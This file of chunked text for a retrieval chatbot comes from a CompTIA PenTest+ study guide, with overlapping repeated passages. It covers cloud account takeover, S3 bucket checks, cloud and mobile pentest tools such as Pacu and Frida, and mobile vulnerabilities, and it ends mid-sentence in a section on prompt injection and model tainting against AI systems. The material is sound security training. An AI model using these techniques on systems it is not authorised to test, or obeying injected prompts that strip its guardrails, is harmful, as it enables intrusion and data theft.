rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	need to take third‐party‐hosted and cloud service into account. Some of the key areas to review are with third‐party integrations, which is a large part of how the cloud ecosystem thrives. You will see as you deploy cloud resources that there are more and more integrations with other services that allow you to expand your service offerings. For example, if you run an application you offer customers from the cloud, you may use authentication services from another provider within the cloud ecosystem. This technically becomes a third‐party integration. If that vendor has a security problem, it now becomes your problem. Another major issue that occurs and creates a series of vulnerabilities is with resource misconfiguration. With the onset of new services, features, new conceptual architecture designs and use, and the influx of complexity that comes with these systems and services, add in a newly educated workforce and you have a series of potential misconfigurations at hand. An example can be of a firewall on a virtual private cloud (VPC) connection between projects. Yes, it's a firewall and much like an ACL or traditional firewall, may seem familiar to you, it is in fact different and can easily be misconfigured. This has led to many vulnerabilities to exist in current cloud environments worldwide. The use of a logical hierarchy within a cloud service provider (CSP) and their environment leads to natural segmentation, but this exists both within an organization's cloud real estate and leased services, but also the entire cloud service providers' environment. Segmentation exists from project to project and even within the CSP itself. Because there are so many sections that are segmented, it can become unwieldly to track and keep track of, which leads to misconfigurations. Various network controls are put in place to keep track of, control, and secure many of these sections within the cloud. Identity and access management (IAM) credentials are used to act as a set of credentials and provide user and role authentication, authorization, and accounting of what a user or group does. These can be assigned via role and provide a large swath of permissions, or granularly based on what the IAM administrator decides to provide based on need. Logging information exposure is also a challenge in that clouds commonly use storage buckets to store logged information, and if the bucket is exposed, so can all the logging data be exposed. Image and artifact tampering is a likely result of any buckets that are exploited. Supply chain attacks are also common due to the fact that, as mentioned earlier, in a, cloud ecosystem it's common to work with a large number of different vendors and if any of them are subject to attack, it's likely you may also fall victim. This also works both ways in that if you are breached, then your vendors may be breached and put at risk. Workload runtime attacks are also growing in volume as more and more workloads, applications, and services run in the cloud, so does
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	artifact tampering is a likely result of any buckets that are exploited. Supply chain attacks are also common due to the fact that, as mentioned earlier, in a, cloud ecosystem it's common to work with a large number of different vendors and if any of them are subject to attack, it's likely you may also fall victim. This also works both ways in that if you are breached, then your vendors may be breached and put at risk. Workload runtime attacks are also growing in volume as more and more workloads, applications, and services run in the cloud, so does the real‐time threat that they may be vulnerable or susceptible to attack. Runtimes are just that—when the application is running, they can be exploited during their execution or use. Remember that cloud‐hosted environments often forbid penetration testing as part of their contracts. That means that your customer, client, or employer may not be allowed to conduct a penetration test against cloud‐hosted systems or services. Even if it is allowed, it may require special coordination or permission before a penetration test is conducted. It is also important to understand where hybrid systems begin and end. In many hybrid environments, some systems may be under local control in a data center and others may be in a cloud infrastructure as a service‐hosting environment or be software as a service components of that same overall ecosystem. Attacking Cloud Accounts Credential harvesting can be conducted in a number of ways, ranging from traditional phishing campaigns to malware‐based theft. It can also include direct acquisition of credentials due to breaches. Regardless of how credentials are obtained, those credentials can then be used to attempt to log into not only the original site or service that the credentials were tied to but to a variety of other sites because of the frequent occurrence of password reuse. The increasing use of multifactor authentication is starting to make this process less useful in many cases, particularly for administrative credentials, but common user accounts remain likely targets because multifactor authentication has not rolled out consistently. A great way to understand the breadth of compromised accounts—and thus accounts that are likely being actively used due to being exposed and thus harvested—is to check an email address against http://haveibeenpwned.com. The site lists billions of compromised accounts and hundreds of compromised websites. Once you have credentials, attacks on cloud services often include some form of account takeover. Account takeover is just what it sounds like: taking over an account and using it. Account takeover as a penetration tester simply means using acquired credentials in most cases, but it may also be possible using secrets (like SSH keys or cloud API tokens) if you're able to acquire them. Once you've taken over an account, you'll often need to consider privilege escalation attacks next. In a cloud environment, this will involve service‐specific techniques that may take advantage of a security weakness, a weak or flawed configuration choice, or a vulnerability in the underlying environment.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	some form of account takeover. Account takeover is just what it sounds like: taking over an account and using it. Account takeover as a penetration tester simply means using acquired credentials in most cases, but it may also be possible using secrets (like SSH keys or cloud API tokens) if you're able to acquire them. Once you've taken over an account, you'll often need to consider privilege escalation attacks next. In a cloud environment, this will involve service‐specific techniques that may take advantage of a security weakness, a weak or flawed configuration choice, or a vulnerability in the underlying environment. You can read more about examples of AWS privilege escalation techniques at https://rhinosecuritylabs.com/aws/aws‐privilege‐ escalation‐methods‐mitigation‐part‐2. Although vulnerability scanning for unpatched software is a common technique for on‐premises or organizationally managed tools, you're somewhat less likely to find similar vulnerabilities for major cloud vendors. That doesn't mean that you couldn't find unpatched systems or devices, but the cloud service itself is likely to be patched as soon as possible. You'll likely find it more effective to focus on misconfigurations and weak design choices like overly broad permissions than on unpatched software versions when attacking cloud services. Another specific attack that may be used is a metadata service attack. In AWS, the Metadata service is used to provide temporary credentials to applications to access S3 (storage) as well as other services. This provides attackers with a potential means of accessing APIs and may lead to other credential acquisition opportunities. You can read more about this specific attack and the opportunities it creates at https://rhinosecuritylabs.com/cloud‐security/aws‐security‐ vulnerabilities‐perspective. Azure's Metadata service is used to get information about running instances such as what operating system it is running, its name, network interfaces and storage settings, or configurable data set for the system itself. Although that metadata is less interesting, it can also be used to gather information about systems running in Azure. Regardless of the cloud service in use, metadata may provide useful information, and cloud metadata services should be considered a potentially useful information source even if they may not be as direct of a path to compromise in most cases at those described in the articles mentioned earlier. Attacking and Using Misconfigured Cloud Assets One of the most common misconfigurations for cloud services occurs due to improper or weak settings at the identity and access management (IAM) layer. These can be as simple as not enforcing best practices for credentials and passwords but often are more specific to the service or system they're set up to protect. Overly broad permissions or groups, manual configurations of individual users that result in improper permissions for those users, or putting the wrong security group or policy on a cloud asset are all common mistakes. Object storage is another common area where pentesters can find treasure troves of data. Many cloud services provide object storage that is used to contain files and other data—Amazon's S3 is a common example of this. When you assess an object store, you'll frequently
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	enforcing best practices for credentials and passwords but often are more specific to the service or system they're set up to protect. Overly broad permissions or groups, manual configurations of individual users that result in improper permissions for those users, or putting the wrong security group or policy on a cloud asset are all common mistakes. Object storage is another common area where pentesters can find treasure troves of data. Many cloud services provide object storage that is used to contain files and other data—Amazon's S3 is a common example of this. When you assess an object store, you'll frequently look for things like: Publicly accessible storage Open upload access Directory listing rights Open download access Although techniques required for testing vary based on the cloud service you're testing, command‐line tools and scripting can provide a powerful way to assess common storage problems. In AWS, you can check to see what a S3 bucket allows using a command such as this: aws s3 ls s3://examplebucket –recursive –human-readable Much like using the ls command in Linux, you'll get a listing of the files in a container, including subdirectories (due to the recursive flag) and in a more human‐readable format. Regardless of the tools or cloud services you are testing, the same basic concepts you're used to for other penetration testing efforts remain true: You'll gather information, assess potential weaknesses or misconfigurations, and leverage them either to meet your objectives or to take further steps toward your goals. In addition to direct storage misconfigurations, an increasing number of attacks focus on secret keys and credentials that either allow access to buckets or leverage improperly configured buckets to allow further attacks. Popular mobile applications were found to contain improperly secured keys in May 2021 (https://thehackernews.com/2021/05/over‐ 40‐apps‐with‐more‐than‐100‐million.html), and those applications contained S3 keys to 88 buckets and terabytes of data. Finally, the PenTest+ exam also requires you to be aware of federation misconfigurations. Federation allows organizations to use or provide services to or from other service providers or consumers. Federating with another entity will result in trust being extended that allows credentials or services to be used, and that trust means that misconfigurations can leak data or provide unintended access. Federation is commonly used between on‐site Active Directory environments and Azure's AD, particularly for Exchange and other Microsoft tools. In this type of environment, a local Active Directory Federation Services (ADFS) server connects to Azure, allowing authentication and authorization between the environments. Since this is basically a Kerberos environment, attacks that focus on signing certificates and tokens can be conducted, and misconfigurations can be leveraged in both local and cloud environments. Other Cloud Attacks The PenTest+ exam outline calls out four specific attack types to focus on for cloud services and systems: Cloud malware injection attacks focus on on‐path attacks that redirect users to attackers instances of cloud services. Traditionally, this would be accomplished using a cross‐site scripting attack, but injecting malicious code into service or code pipelines or otherwise adding malicious tools into
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Azure, allowing authentication and authorization between the environments. Since this is basically a Kerberos environment, attacks that focus on signing certificates and tokens can be conducted, and misconfigurations can be leveraged in both local and cloud environments. Other Cloud Attacks The PenTest+ exam outline calls out four specific attack types to focus on for cloud services and systems: Cloud malware injection attacks focus on on‐path attacks that redirect users to attackers instances of cloud services. Traditionally, this would be accomplished using a cross‐site scripting attack, but injecting malicious code into service or code pipelines or otherwise adding malicious tools into existing cloud infrastructure can also be pathways to accomplishing this task. Resource exhaustion and denial‐of‐service attacks are listed separately but are closely related. Even though cloud services are frequently designed to scale under load, it is still possible to overload them— either due to design or capacity issues with the service or server, or because the underlying cloud service cannot handle additional load. Pentesters are less likely to be asked to perform denial‐of‐service and resource exhaustion attacks as part of a penetration test because this drives costs and because load testing is frequently done as part of service validation and testing rather than as security testing in many cloud operations. Direct‐to‐origin (D2O) attacks are a form of distributed denial‐of‐ service attack that work to bypass content delivery networks (CDNs) or other load distribution and proxying tools and attack the underlying service infrastructure. They are intended to negate the protections and capacity provided by CDNs, allowing attackers to target a less scalable or less protected service. They rely on the ability of attackers to determine the original IP address(es) of the service, so pentesters need to focus on acquiring that data to conduct the attack. Like resource exhaustion and other denial‐of‐service attacks, D2O attacks are less likely to be conducted because of the cost and impact of the attack. Unlike with actual attacks, pentesters are likely to be asked to identify if service origin data can be obtained as part of their report. Side‐channel attacks in cloud environments rely on the ability to gain access that allows pentesters to capture information by leveraging shared underlying hardware. Infrastructure as a service (IaaS) environments deploy multiple virtual machines on the same hardware platform, meaning that attackers may be able to use shared resources or compromise of the virtualization or containerization system itself to gain access to data without compromising the target system itself. Figure 10.10 shows a simplified example of one type of side‐channel attack that was possible in some cloud environments in the past. It leverages a remnant data vulnerability when virtual drives are resized. Fortunately, the major players in the IaaS space have prevented this issue by using encrypted volumes and other techniques to ensure remnant data is no longer an issue. Despite this, side‐channel attacks will always remain a concern while systems share underlying hardware. FIGURE 10.10 Side‐channel attack against a virtual machine Cloud service providers address the concern of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	gain access to data without compromising the target system itself. Figure 10.10 shows a simplified example of one type of side‐channel attack that was possible in some cloud environments in the past. It leverages a remnant data vulnerability when virtual drives are resized. Fortunately, the major players in the IaaS space have prevented this issue by using encrypted volumes and other techniques to ensure remnant data is no longer an issue. Despite this, side‐channel attacks will always remain a concern while systems share underlying hardware. FIGURE 10.10 Side‐channel attack against a virtual machine Cloud service providers address the concern of side‐channel attacks by providing dedicated underlying hardware for an additional cost. This can be expensive, but organizations that have specific security concerns or requirements may opt for dedicated hardware platforms. Tools for Cloud Technology Attacks For the PenTest+ exam, you'll need to be familiar with a series of specific tools aimed at cloud penetration testing as well as one broad category— SDKs. Although you won't need to know how to use these tools in specific detail, you should be familiar with what they are and the existence of tools like them. Cloud‐native vendor tools: There are many, many tools that come with the cloud services themselves. This includes cloud management console‐based tools found within the console and also command‐line functions that can also be used. Docker Bench: Docker is a tool that allows you to create containers and deploy them. Docker Bench is a service that helps you to create these containers and deploy them into cloud providers' environments. Kube‐hunter: If you're considering a pentest against a Kubernetes environment, you may want to check out kube‐hunter, a dedicated Kubernetes penetration testing tool designed to conduct both passive and active tests against K8s environments and services. Prowler: Prowler is an open‐source pentester tool that allows you to assess cloud‐based Kubernetes environments. ScoutSuite: This is an open‐source multicloud auditing tool. It leverages APIs to gather configuration data. Unlike with tools that perform active scans, this means that you can run ScoutSuite without having to notify cloud providers about penetration testing or scanning activities. Since it uses API access, it needs an appropriately privileged system that can make the API calls it uses for auditing. It includes default rulesets that are intended to identify common misconfigurations as well as supporting the ability to write your own custom rules to identify issues that you may want to keep track of (or find during a pentest). You can read more about ScoutSuite at https://github.com/nccgroup/ScoutSuite. CloudBrute: This is a cloud enumeration tool designed to identify applications and storage in multiple cloud provider environments. CloudBrute will run without credentials and is designed to try common brute‐force techniques to help enumerate cloud resources like word lists and mutation capabilities. You can read more details at https://github.com/0xsha/CloudBrute. Pacu: This is an Amazon AWS–specific exploitation framework. It uses multiple modules to perform actions like testing for privilege escalation or disrupting monitoring efforts. It can also implant backdoors via IAM user
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	may want to keep track of (or find during a pentest). You can read more about ScoutSuite at https://github.com/nccgroup/ScoutSuite. CloudBrute: This is a cloud enumeration tool designed to identify applications and storage in multiple cloud provider environments. CloudBrute will run without credentials and is designed to try common brute‐force techniques to help enumerate cloud resources like word lists and mutation capabilities. You can read more details at https://github.com/0xsha/CloudBrute. Pacu: This is an Amazon AWS–specific exploitation framework. It uses multiple modules to perform actions like testing for privilege escalation or disrupting monitoring efforts. It can also implant backdoors via IAM user account modification and security groups, and it has tools built in to provide remote code execution capabilities using AWS native system management tools. Rhino Security Labs provides more details about Pacu at https://rhinosecuritylabs.com/aws/pacu‐ open‐source‐aws‐exploitation‐framework. Cloud Custodian: Cloud Custodian is not intended to be a pentesting tool—in fact, it's designed to allow users to secure their cloud environment. That doesn't mean it doesn't have a role to play in pentests, though. The reports that Cloud Custodian can provide about a cloud environment can identify issues that a pentester can then leverage for further access. You can read more about Cloud Custodian and how it is used at https://cloudcustodian.io. Finally, you need to consider native cloud software development kits (SDKs). Major cloud services provide their own software development kits that provide tools and libraries that can be used to create tools that leverage their cloud capabilities. These SDKs can allow you to directly control cloud environments, manage virtual machines and services, consecurity features or other components, or provide other capabilities that can be incredibly useful for a penetration tester. You can read more about Google's SDK at https://cloud.google.com/sdk, Amazon provides their tools at https://aws.amazon.com/tools, and Azure's can be found at https://azure.microsoft.com/en‐us/downloads. Many other providers and services also have their own SDKs, so it's worth your time to go look at what exists if your target uses something else. Attacking Mobile Devices Mobile devices make up an ever‐increasing percentage of the devices on many networks, and they exist in a complex place between organizationally owned devices and personally owned devices. That means that management practices and organizational controls may be lacking, but that devices may also be out of scope in some penetration tests. Mobile attacks are now making up the majority of all end‐user endpoint device abuse attacks taking place today. Most people carry their phone with them, more so than a laptop, pad, or other mobile device. Many run various applications (apps) on their phones and use them for personal use and work. Because of this, they are often the target of exploitation. They are also increasingly vulnerable to attack. Since more and more apps are installed on them and more reliance on them continues to grow, so do vulnerabilities. Information disclosure is quite often the biggest concern with mobile devices. Most people use them all day, every day. They manage their calendars, email, text messaging, banking, health records, and quite
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	people carry their phone with them, more so than a laptop, pad, or other mobile device. Many run various applications (apps) on their phones and use them for personal use and work. Because of this, they are often the target of exploitation. They are also increasingly vulnerable to attack. Since more and more apps are installed on them and more reliance on them continues to grow, so do vulnerabilities. Information disclosure is quite often the biggest concern with mobile devices. Most people use them all day, every day. They manage their calendars, email, text messaging, banking, health records, and quite literally anything you can think of from them. Since that is the case, if they are exploited, disclosure of sensitive information is high on the list of top attacks on mobile devices. Many of the same issues you experience with operating systems also exist on mobile devices, such as theft, permission abuse, and malware. Jailbreak/rooting is also another major concern. Mostly with Apple devices that are secured by default to only use recommended and suggested apps from their App Store, this also comes with a price of reduced flexibility. Therefore, if you want to install unauthorized software, you need to “jailbreak” the device. This is also called rooting on Android devices. The issue with jailbreaking or rooting a device is that once you reduce that layer of security and control, you increase the likelihood that malware can be entered into your device and cause issue. The only way to conclude that your device is secure is by testing it to ensure that it is. Pentesting mobile devices follows many of the same steps you would take if you were testing a host, cloud‐based, or any other system. When you're scoping a penetration test, you should determine if mobile devices are in scope. If they are, you'll want to examine the organization's policies on mobile device ownership and what devices are acceptable to target. Conducting a penetration test against an individually owned device that is used to access organizational systems can lead to serious issues, particularly if data is lost or other damage occurs. Despite this complexity, mobile devices are an important part of organizational footprints and can provide useful information as well as a path into an organization. Since they often have their own Internet connections, they may also provide a bridge or path around an organization's security defenses. Thus, as you consider the areas that the PenTest+ exam looks at for mobile devices, bear in mind how you might leverage them to gain further access and what data you would look for if you gained access. The PenTest+ exam outline looks at three specific types of attacks against mobile devices: Reverse engineering processes involve analyzing mobile applications to find useful information or to identify vulnerabilities. Decompilers, as well as tools like MobSF that can provide static and dynamic code analysis, can be used to analyze applications. When mobile code isn't a compiled binary and instead is an interpreted script
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	as you consider the areas that the PenTest+ exam looks at for mobile devices, bear in mind how you might leverage them to gain further access and what data you would look for if you gained access. The PenTest+ exam outline looks at three specific types of attacks against mobile devices: Reverse engineering processes involve analyzing mobile applications to find useful information or to identify vulnerabilities. Decompilers, as well as tools like MobSF that can provide static and dynamic code analysis, can be used to analyze applications. When mobile code isn't a compiled binary and instead is an interpreted script written in HTML or JavaScript, you can also directly review and analyze the code without additional tools being required. Reverse engineering can be a time‐intensive process, so pentesters will often look for common targets like embedded secrets, passwords, or API information, as well as other details that may be useful for further penetration testing. Directories, server information, and other data elements included in code can be useful for further data gathering or exploitation. Sandbox analysis involves running code or even a complete device image in a controlled environment. Sandboxes can be used to monitor how an application behaves, what it accesses, and what occurs when it runs. Although this is often used to analyze malware, it can also provide significant amounts of information to pentesters when reviewing an application. iOS and Android also both provide native application sandboxing, so pentesters may need to consider if they are able to break out of an application sandbox and past controls like those provided by SELinux/SEAndroid. Spamming may not be something you think of immediately with a mobile device, but it can be used in multiple ways as part of an attack against them. First, spam texts, emails, or calls can be used as part of phishing attacks or other social engineering exercises. Mobile users can be tricked into clicking on links or installing malicious applications, allowing pentesters to gain access to the device. Second, spamming is a frequent part of credential harvesting attacks. Although the PenTest+ exam outline isn't specific about how spamming might be used to attack mobile devices and applications, you should be aware that it's a potential answer and topic on the exam. In addition to three types of attacks against mobile devices and applications, you'll need to know about a number of common categories of vulnerabilities for the exam. You should be prepared to explain the basics of each of these vulnerabilities and what they would mean in the context of a pentest. The first vulnerability you'll need to consider is the use of insecure storage. This can take a number of forms; it can be the use of local storage like a removable microSD card and unencrypted data, or it can even include storage via a cloud service, API, or object storage that is not properly secured by the application due to exposed keys or APIs. When a mobile application or operating system stores data of any
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	exam. You should be prepared to explain the basics of each of these vulnerabilities and what they would mean in the context of a pentest. The first vulnerability you'll need to consider is the use of insecure storage. This can take a number of forms; it can be the use of local storage like a removable microSD card and unencrypted data, or it can even include storage via a cloud service, API, or object storage that is not properly secured by the application due to exposed keys or APIs. When a mobile application or operating system stores data of any type, pentesters may have an opportunity to access it. Thus, you'll want to consider what data the application uses and stores, where and how it is stored, and how you might gain access to it. Although unsecured data in an easy‐to‐access location is the easiest option, you might also be able to inject code, use cross‐site scripting attacks, bypass authentication, or reverse‐engineer the application itself to gain access to data at rest. Passcode vulnerabilities can occur at the operating system or the application level. They may be as simple as allowing a bypass through an email reset or other access method, or they may be more complex and require injection using a tool like Frida to modify a JavaScript authentication process. If you have physical access to a mobile device, you may even be able to simply tip the device into the light and see where the most frequent fingerprints are on the screen where the passcode is entered and make a few guesses about what the passcode is based on those fingerprints! Certificate pinning pairs a host with a x.509 certificate. Attacking certificate pinning practices may require adding additional certificates or keys to the devices or getting users to do so to allow you to bypass a pinned certificate. Social engineering and attacking the technical infrastructure of an organization to gain control of device management capabilities are both ways to accomplish this task. With a complex ecosystem and multiple operating systems to keep track of, it isn't uncommon to discover that developers and organizations are using known vulnerable components. That may be because of dependency vulnerabilities, where a component that the application or device OS relies on is vulnerable, or it may be because of complexities like those found in the Android ecosystem with its many providers and custom OS versions that result in patching fragmentation. In other words, many different versions result in a complex set of versions that tend to result in patches not being provided, not being compatible, or not being installed, providing an opportunity for pentesters. Execution of activities using root is a danger for any operating system, but in mobile operating systems applications are typically partitioned away from this by sandboxing systems like SEAndroid/SELinux. That doesn't mean a penetration tester can't take advantage of root‐level access; it just means that this attack method will typically be more difficult. Attacks against the OS itself, however,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	OS versions that result in patching fragmentation. In other words, many different versions result in a complex set of versions that tend to result in patches not being provided, not being compatible, or not being installed, providing an opportunity for pentesters. Execution of activities using root is a danger for any operating system, but in mobile operating systems applications are typically partitioned away from this by sandboxing systems like SEAndroid/SELinux. That doesn't mean a penetration tester can't take advantage of root‐level access; it just means that this attack method will typically be more difficult. Attacks against the OS itself, however, may be possible via other methods—in fact, many rootkit tools take advantage of this type of flaw. Thus, for many mobile devices you're somewhat more likely to be tackling this type of attack through the OS or OS‐native components rather than third‐party applications. A related issue is when there is an over‐reach of permissions or overly broad permissions are set. Again, this is a common issue with most operating systems, and one that you'll need to be on the lookout for. Checking what an application or service can do, and what user it runs as, can provide a clear hint at whether this may be a flaw you can leverage. Biometrics integrations are common for mobile devices and mobile applications. If you're an iOS user, you're likely used to seeing FaceID as a possibility for an increasing number of application authentication processes. Those integrations may be vulnerable, and you may be able to inject spurious authentication approvals into them. Analyzing how biometric authentication is handled, where the handoff and validation occurs, and what is done with that information can provide a useful way to bypass passcode authentication. As with many attacks, if you have physical access to the device you may also have other options—in some cases, simply having a picture of a user or a copy of their fingerprint may be able to unlock a device, although modern facial recognition and fingerprint readers are designed to be resistant to that type of attack. Understanding what a facial recognition system is looking for can provide attackers with ideas on how to bypass it. In this 2019 Forbes article, researchers took advantage of the fact that FaceID didn't handle glasses particularly well. The attack requires some pretty specific items: a nonresistant device owner, and a special pair of glasses, but the thought process is similar to the path to many biometric attacks. See https://www.forbes.com/sites/daveywinder/2019/08/10/apples‐iphone‐ faceid‐hacked‐in‐less‐than‐120‐seconds/?sh=73819aa021bc. Business logic vulnerabilities can also be targeted by pentesters. Although these aren't specific to mobile devices, you'll need to be ready to think about them in a mobile device context. That may include leveraging business logic flaws in mobile applications, or how mobile apps may differ from normal web applications with different code bases and libraries to take advantage of. Compromising mobile devices themselves is a less common path for most pentesters. In many cases, mobile devices are personally owned, which often removes them from the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	thought process is similar to the path to many biometric attacks. See https://www.forbes.com/sites/daveywinder/2019/08/10/apples‐iphone‐ faceid‐hacked‐in‐less‐than‐120‐seconds/?sh=73819aa021bc. Business logic vulnerabilities can also be targeted by pentesters. Although these aren't specific to mobile devices, you'll need to be ready to think about them in a mobile device context. That may include leveraging business logic flaws in mobile applications, or how mobile apps may differ from normal web applications with different code bases and libraries to take advantage of. Compromising mobile devices themselves is a less common path for most pentesters. In many cases, mobile devices are personally owned, which often removes them from the scope of a penetration test. Mobile device pentesting can also involve the devices, management tools, and applications. Attacking mobile applications involves many of the same techniques used for web and other application attacks. Obtaining access to locally stored data, executing SQL injection attacks, capturing unencrypted or poorly protected data in transit, and targeting encryption keys are all techniques that application pentesters will use. Application testing techniques also include static analysis (of code), dynamic analysis (of a running application), network traffic capture and assessment, SSL pinning and downgrade attacks, and methods for obtaining root access via application exploits. When mobile device applications are in testing scope, specialized tools can help exploit Android and iOS devices. There are fewer common open‐ source tools than you might find for similar tasks on desktop operating systems, but for the PenTest+ exam, you are expected to be familiar with quite a few. As you review this list, remember that this section of the exam outline requires you to explain common attacks and vulnerabilities, so consider how you'd use these tools as part of an attack as well as what vulnerabilities you could exploit using them. Burp Suite is a web application vulnerability scanning and penetration testing toolset. There are multiple versions, including a free community version. It is worth noting that this tool is something you're more likely to associate with web application security than with mobile applications, but it appears in the mobile section of the PenTest+ outline. In that context, you should remember web‐based mobile apps and underlying services. You can read more about it and the various Burp Suite versions at https://portswigger.net/burp/communitydownload. MobSF, the Mobile Security Framework, is an automated Android/iOS and Windows penetration testing, security assessment, and malware analysis framework. It can perform both static (source code) and dynamic (running application) analysis, and it supports a wide range of application binaries. Like most modern tools, it also supports inclusion in a continuous integration/deployment model, which means you may encounter it both as a tool and as part of the environment at target sites. You can find the tool at https://github.com/MobSF/Mobile‐ Security‐Framework‐MobSF. Postman is an API (application programming interface) testing tool that can perform stress testing, API functionality testing, and a variety of other API validation tasks. Like Burp Suite, it's not really a mobile‐ specific tool and is more likely to be useful in the context of web application and general
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	analysis, and it supports a wide range of application binaries. Like most modern tools, it also supports inclusion in a continuous integration/deployment model, which means you may encounter it both as a tool and as part of the environment at target sites. You can find the tool at https://github.com/MobSF/Mobile‐ Security‐Framework‐MobSF. Postman is an API (application programming interface) testing tool that can perform stress testing, API functionality testing, and a variety of other API validation tasks. Like Burp Suite, it's not really a mobile‐ specific tool and is more likely to be useful in the context of web application and general API testing. More detail can be found at https://postman.com. Ettercap is a suite of tools designed to carry out on‐path attacks. Although it is useful against mobile applications, it can also be used against a wide variety of systems and services. It is open source and can be downloaded from www.ettercap‐project.org. Frida is an injection tool that can be used to inject JavaScript code or other libraries into native applications for both mobile (Android and iOS) and other operating systems like Windows and macOS. Tools like Frida can be used to intercept and modify JavaScript responses in applications to bypass input requirements or even authentication processes, as well as for other tasks where injecting your own code or responses may be useful. It also supports multiple languages like Python, .NET, Swift, and C. For a quick introduction on how to use Frida, check out https://notsosecure.com/pentesting‐android‐apps‐ using‐frida. Needle is a no‐longer‐supported iOS‐specific security tool designed for earlier versions of iOS (9 and 10). Much like Cain, it still shows up in the PenTest+ outline, so you need to know that it is a framework for iOS security testing, but you're unlikely to run into it in the real world. Frida, listed earlier, has replaced it in current use and maintenance. If you'd like to learn more about how to use both Frida and Objection, Virtue Security provides a quick tutorial at https://www.virtuesecurity.com/kb/ios‐frida‐objection‐ pentesting‐cheat‐sheet. Objection is powered by Frida and is used to assess mobile applications—it is described as a “runtime mobile exploration” tool. It places runtime objects into running processes using Frida, allowing you to execute code inside of whatever sandbox or environment the mobile device or system has the code running in. You can find a tutorial on the use of Objection at https://book.hacktricks.xyz/mobile‐ apps‐pentesting/android‐app‐pentesting/frida‐tutorial/objection‐tutorial to get you started. It's important to note that Objection doesn't provide a jailbreak or rooting capability. Thus, what you can do is limited by what code in a given sandbox can do. The Android SDK tools are used to build applications for Android devices. That means that if you need to build an exploit for Android devices you'll likely be using the SDK from https://developer.android.com/studio. Drozer, an Android security assessment framework, has existing exploits built in and is designed to help assess the security posture of Android applications. The Drozer site also provides Sieve, an application that includes common Android security issues, allowing you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	important to note that Objection doesn't provide a jailbreak or rooting capability. Thus, what you can do is limited by what code in a given sandbox can do. The Android SDK tools are used to build applications for Android devices. That means that if you need to build an exploit for Android devices you'll likely be using the SDK from https://developer.android.com/studio. Drozer, an Android security assessment framework, has existing exploits built in and is designed to help assess the security posture of Android applications. The Drozer site also provides Sieve, an application that includes common Android security issues, allowing you to learn how to test Android security using a test application. You can find Drozer at https://github.com/WithSecureLabs/drozer. Using Drozer is as simple as setting it up, installing the drozer agent and launching it, then using Drozer's modules to test for an application's attack surface, and finally using various modules to test the application based on the attack surface you discover. APKX is a wrapper for various Java decompilers and DEX converters that allows you to extract Java source code from Android packages. If you want to directly analyze Java code inside an APK, APKX provides a convenient way to do so. You can find it at https://github.com/b‐ mueller/apkx. APK Studio is an integrated development environment (IDE) designed for reverse‐engineering Android applications. APK Studio hasn't been updated since 2015 as of this writing, but you can find it at https://github.com/vaibhavpandeyvpz/apkstudio. The PenTest+ exam objectives don't include any iOS mobile application penetration testing tools, but such tools do exist. In fact, OWASP has an iOS application pentesting tool called iGoat available for download at https://github.com/OWASP/igoat. Much like OWASP's WebGoat project, iGoat provides step‐by‐step tutorials on application vulnerabilities as well as guidance on how to exploit each of the common vulnerabilities it explains. If you're learning how to attack mobile devices, starting with iGoat is a great choice. Although the PenTest+ exam specifically mentions these tools, the general process for testing depends on whether you are targeting the mobile device's operating system or the applications installed on the device. As with many of the more advanced skill sets mentioned in this book, mobile device hacking and application reverse engineering are beyond the scope of this book. You can find a good introduction at https://pentestlab.blog/category/mobile‐pentesting and a great cheat sheet for mobile application pentesting at https://github.comtanprathan/MobileApp‐Pentest‐Cheatsheet. Attacking Artificial Intelligence (AI) As more systems become reliant on artificial intelligence (AI), the more it must be part of a pentester's evaluation. AI is not new and has been around for a long time. What is new is the number of systems that have incorporated AI into their code or that interact with AI,which makes it concerning based on the number of attacks that are growing with its continued growth and use. AI is the function of a computer system or application making a decision based on what it knows and has learned. It can only do what it knows, and it only knows what it has
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	reliant on artificial intelligence (AI), the more it must be part of a pentester's evaluation. AI is not new and has been around for a long time. What is new is the number of systems that have incorporated AI into their code or that interact with AI,which makes it concerning based on the number of attacks that are growing with its continued growth and use. AI is the function of a computer system or application making a decision based on what it knows and has learned. It can only do what it knows, and it only knows what it has learned. The learning comes from models that are used to teach AI what it knows. An example of this would be leveraging a tool like ChatGPT; you would take a snapshot of the Internet as a whole and load it into a very large database. The tool can then use it and learn from it so when it is asked questions (prompting), it will return answers based on what it has learned from the models and how it was prompted. The models would be quite big, and they are often called large language models (LLMs). The two biggest methods to abuse AI is through prompt injection and model manipulation. Although the PenTest+ exam specifically mentions AI attacks, the focus is on understanding the types of attacks that are focused on AI and why it's important to pentest for vulnerabilities. You should know the basics of AI so that you can understand the attacks; one of the concepts that requires some insight is generative AI. This technology can be used to produce text, images, video, and other content. You can learn more at https://www.ibm.com/think/topics/artificial‐ intelligence. Prompt Injection Prompt injection is an attack that can trick the prompting of an AI tool like ChatGPT to try to produce sensitive information or worse, use it to disperse or spread incorrect information. Remember, AI only knows what it learns, so if you taint the model it's trained on, or the database it learns from, it will produce incorrect information. Prompting is also hard to do if you haven't learned how to do it, so it takes some time to produce good results. However, if you are savvy or knowledgeable, you can gather quite a bit of information. You can also use AI to conduct surveillance and gather information for attacks as well. Prompt injections can also be used to trick a tool such as ChatGPT to reduce its own security by prompting it to remove its own guardrails, or to ignore instructions it has been given to secure information. Again, if prompted correctly, an attacker can inject whatever they want into the system. The only way to fully secure AI is to stop it from learning certain aspects of security, which goes against the nature of what it's programmed to do. Because of this, prompt injection remains a running issue with these types of systems. The main way a prompt injection attack can be
